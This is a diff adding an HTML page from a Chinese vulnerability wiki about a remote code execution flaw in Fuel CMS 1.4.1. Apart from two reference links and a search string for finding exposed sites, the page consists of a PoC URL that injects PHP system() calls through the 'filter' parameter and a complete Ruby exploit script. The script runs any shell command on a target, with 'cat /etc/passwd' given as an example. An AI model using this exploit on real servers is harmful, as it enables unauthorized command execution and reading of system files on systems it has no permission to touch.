@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/CMS%E6%BC%8F%E6%B4%9E/Fuel%20CMS%201.4.1%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Fuel CMS 1.4.1 远程代码执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Fuel CMS 1.4.1 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_2" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Joomla%203.4.5%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2015-8562/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Joomla%203.4.5%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2015-8562/" class="btn btn-xs btn-link">
+        Joomla 3.4.5 反序列化漏洞 CVE-2015-8562
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../ECShop%204.x%20collection_list%20SQL%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../ECShop%204.x%20collection_list%20SQL%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        ECShop 4.x collection_list SQL注入
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="fuel-cms-141">Fuel CMS 1.4.1 远程代码执行漏洞<a class="headerlink" href="#fuel-cms-141" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://github.com/nahi/httpclient/issues/242">https://github.com/nahi/httpclient/issues/242</a></li>
+<li><a href="https://www.exploit-db.com/exploits/49487">https://www.exploit-db.com/exploits/49487</a></li>
+</ul>
+<h2 id="_2">网络测绘<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>&quot;Fuel CMS&quot;
+</code></pre></div>
+<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>poc：</p>
+<div class="highlight"><pre><span></span><code>/fuel/pages/select/?filter=&#39;%2Bpi(print(%24a%3D&#39;system&#39;))%2B%24a(&#39;#{cmd}&#39;)%2B&#39;
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>#!/usr/bin/env ruby
+
+require &#39;httpclient&#39;
+require &#39;docopt&#39;
+
+# dirty workaround to ignore Max-Age
+# https://github.com/nahi/httpclient/issues/242#issuecomment-69013932
+$VERBOSE = nil
+
+doc = &lt;&lt;~DOCOPT
+  Fuel CMS 1.4 - Remote Code Execution
+
+  Usage:
+    #{__FILE__} &lt;url&gt; &lt;cmd&gt;
+    #{__FILE__} -h | --help
+
+  Options:
+    &lt;url&gt;         Root URL (base path) including HTTP scheme, port and root folder
+    &lt;cmd&gt;         The system command to execute
+    -h, --help    Show this screen
+
+  Examples:
+    #{__FILE__} http://example.org id
+    #{__FILE__} https://example.org:8443/fuelcms &#39;cat /etc/passwd&#39;
+DOCOPT
+
+def exploit(client, root_url, cmd)
+  url = root_url + &quot;/fuel/pages/select/?filter=&#39;%2Bpi(print(%24a%3D&#39;system&#39;))%2B%24a(&#39;#{cmd}&#39;)%2B&#39;&quot;
+
+  res = client.get(url)
+
+  /system(.+?)&lt;div/mx.match(res.body).captures[0].chomp
+end
+
+begin
+  args = Docopt.docopt(doc)
+  clnt = HTTPClient.new
+  puts exploit(clnt, args[&#39;&lt;url&gt;&#39;], args[&#39;&lt;cmd&gt;&#39;])
+rescue Docopt::Exit =&gt; e
+  puts e.message
+end
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Joomla%203.4.5%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2015-8562/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Joomla%203.4.5%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2015-8562/" class="btn btn-xs btn-link">
+        Joomla 3.4.5 反序列化漏洞 CVE-2015-8562
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../ECShop%204.x%20collection_list%20SQL%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../ECShop%204.x%20collection_list%20SQL%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        ECShop 4.x collection_list SQL注入
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
